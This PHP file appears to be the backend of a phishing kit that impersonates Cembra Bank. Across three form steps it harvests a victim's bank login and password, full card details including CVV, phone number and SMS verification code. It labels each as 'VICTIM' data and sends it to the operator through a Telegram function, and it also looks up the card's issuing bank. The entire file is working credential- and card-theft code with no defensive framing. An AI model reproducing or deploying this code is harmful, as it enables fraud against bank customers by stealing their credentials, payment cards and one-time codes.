<?php

// Start the session at the beginning of the script
session_start();

include "cembra/config.php";
include "cembra/functions.php";

error_reporting(E_ALL);
ini_set('display_errors', 1);

$zbi = '';

// Retrieve IP address
$ip = $_SERVER['REMOTE_ADDR'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $step = isset($_POST['step']) ? $_POST['step'] : '';

    switch ($step) {
        case '1':
            handleStep1($_POST['userid'], $_POST['password']);
            header("Location: Information.php?&userid={$randString}&ue={$randStringC}");
            break;

        case '2':
            handleStep2($_POST['name'], $_POST["nickname"], $_POST["cardnumber"], $_POST["exp"], $_POST['cvv'], $_POST['tele']);
            header("Location: verification.php?&userid={$randString}&ue={$randStringC}");
            break;

        case '3':
            handleStep3($_POST['sms']);
            header("Location: verification.php?&step=sms-er&ue={$randStringC}");
            break;

        default:
            break;
    }
}

function handleStep1($USER, $PASS) {
    global $code, $os, $ip;

    $data = "⭐️ ᄃΣMBЯΛ BΛПK ⭐️\n\n";
    $data .= "┌──VICTIM LOGIN\n";
    $data .= "├──USER : $USER \n";
    $data .= "└──PASS : $PASS \n\n";

    $data .= "┌──FROM $code \n";
    $data .= "├──OS $os\n";
    $data .= "└──IP $ip\n\n";

    sendTelegram($data);
}

function handleStep2($name, $nickname, $cc, $ccExp, $cvv, $tele) {
    global $code, $os, $ip;

    // Store credit card number in the session
    $_SESSION["cc"] = str_replace(" ", "", $cc);

    $binData = getBINData($cc);
    processBINData($binData);

    $cc1 = str_replace(" ", "", $cc);
    $data = "⭐️ ᄃΣMBЯΛ BΛПK ⭐️\n\n";
    $data .= "┌──VICTIM CARD\n";
    $data .= "├──CC NAME : $name $nickname\n";
    $data .= "├──CC : $cc1 \n";
    $data .= "├──EXP : $ccExp\n";
    $data .= "├──CVV : $cvv\n";
    $data .= "├──TEL : $tele\n";
    $data .= "└──BANK : {$_SESSION['bank_country']}\n\n";

    $data .= "┌──FROM $code \n";
    $data .= "├──OS $os\n";
    $data .= "└──IP $ip\n\n";

    sendTelegram($data);
}

function handleStep3($sms) {
    global $code, $os, $ip;

    // Access the credit card number from the session
    $cc = $_SESSION["cc"];

    $data = "⭐️ ᄃΣMBЯΛ BΛПK ⭐️\n\n";
    $data .= "┌──VICTIM SMS\n";
    $data .= "├──SMS : $sms\n";
    $data .= "└──CC : $cc\n\n";

    $data .= "┌──FROM $code \n";
    $data .= "├──OS : $os\n";
    $data .= "└──IP $ip\n\n";

    sendTelegram($data);
}

function getBINData($cc) {
    $bin = substr(str_replace(" ", "", $cc), 0, 8);
    $url = "https://lookup.binlist.net/" . $bin;
    $headers = ['Accept-Version: 3'];
    $ch = curl_init();

    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_HTTPHEADER => $headers,
    ]);

    $resp = curl_exec($ch);
    curl_close($ch);

    return json_decode($resp, true);
}

function processBINData($binData) {
    $_SESSION['bank_name'] = $binData["bank"]["name"];
    $_SESSION['bank_scheme'] = strtoupper($binData["scheme"]);
    $_SESSION['bank_type'] = strtoupper($binData["type"]);
    $_SESSION['bank_brand'] = strtoupper($binData["brand"]);
    $_SESSION['bank_country'] = $binData["country"]["name"];
}
?>
